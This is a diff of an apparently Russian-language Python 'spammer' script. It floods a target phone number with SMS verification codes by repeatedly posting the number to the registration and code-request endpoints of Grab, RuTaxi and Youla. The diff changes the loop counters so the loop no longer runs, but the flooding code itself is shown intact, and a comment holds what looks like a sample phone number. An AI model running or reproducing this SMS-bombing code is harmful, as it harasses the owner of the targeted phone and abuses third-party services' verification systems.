@@ -54,9 +54,9 @@ class spymer:
 		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
 		print(showstatus(wrapsbrace('info', True) + ('Отправка SMS на: +{}').format(_phone)))
 		print('Спамер запущен.\nЕсли Вы хотите остановить - нажмите Ctrl+Z.')
-		i = 1
+		i = 10
 		iteration = 1000
-		while i < 10:
+		while i < 1:
 			_email = _name+f'{iteration}'+'@gmail.com'
 			grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'})
 			rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
@@ -70,7 +70,7 @@ class spymer:
 	
 			youla = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
 			
-			iteration += 50
+			iteration += 1000
 			print(('{} чпуньк.').format(iteration))
 
 spammer = spymer()
